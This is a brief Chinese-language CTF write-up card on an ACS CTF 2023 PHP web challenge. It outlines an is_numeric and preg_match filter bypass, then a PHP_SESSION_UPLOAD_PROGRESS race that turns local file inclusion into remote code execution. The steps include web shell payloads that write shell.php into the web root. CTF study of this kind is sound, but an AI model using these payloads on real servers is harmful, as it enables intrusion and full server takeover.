---
title: "ASEAN Cyber Shield (ACS) CTF 2023 [WEB]"
category: web
tags: ["ACS CTF", "web", "is_numeric绕", "preg_match %091", "/^[0-9+-\\/*e ]/i", "LFI"]
signals: ["ACS CTF 2023", "is_numeric绕", "preg_match %091", "/^[0-9+-\\/*e ]/i", "LFI", "PHP_SESSION_UPLOAD_PROGRESS", "session_upload_progress_enabled", "include_once", "1MB padding race", "lfi", "ASEAN", "ACS", "CTF", "is_numeric"]
difficulty: medium
source: "https://www.ctfiot.com/147517.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# ASEAN Cyber Shield (ACS) CTF 2023 [WEB]

> 赛事：ACS CTF 2023 | 方向：web | 难度：medium

## 一句话总结

ASEAN ACS CTF 2023 — is_numeric 弱类型 + preg_match /^[0-9...]/i %09 旁路 + PHP_SESSION_UPLOAD_PROGRESS LFI race 写 shell.php。

## 攻击链

1. 弱类型: is_numeric($num) 接受 '' 091'' / ''\x091'' 等
2. preg_match("/^[0-9+-\/*e ]/i", $num): 用 %09 (tab) 旁路, 实际匹配首字符
3. %091 被解释为 \t + 1
4. $page preg_match 过滤 flag/php/conf/*/''/": 走 /tmp/sess_XXXXX
5. PHP_SESSION_UPLOAD_PROGRESS 写 session: <?php system($_GET[''cmd'']); ?>
6. 多线程 POST + GET race, session 文件落到 /tmp/sess_<id>
7. include_once('/tmp/sess_<id>') 触发 LFI RCE
8. 1MB padding race 保证文件在 include 时仍存在
9. 写 shell.php: <form data PHP_SESSION_UPLOAD_PROGRESS="<?php phpinfo();fputs(fopen(''/var/www/html/shell.php'',''w''),''<?php system($_GET[0]); ?>'');?>">

## 关键 payload

```
is_numeric($num) + preg_match("/^[0-9+-\/*e ]/i") 旁路 / PHP_SESSION_UPLOAD_PROGRESS / session_upload_progress / include_once / race 1MB
```

## 经验教训

is_numeric 接受 '\t1' '\n1' 等;PHP_SESSION_UPLOAD_PROGRESS 是 LFI-to-RCE 经典 (前提 session.upload_progress.enabled=on);race 需 1MB 填充让文件活过 include。

## 标签

is_numeric绕、preg_match %091、/^[0-9+-\/*e ]/i、LFI、PHP_SESSION_UPLOAD_PROGRESS、session_upload_progress_enabled、include_once、1MB padding race、/tmp/sess_XXXXX、shell.php写

## 参考来源

- https://www.ctfiot.com/147517.html
- 原文件：ASEAN_Cyber_Shield_(ACS)_CTF_2023_[WEB].full.md
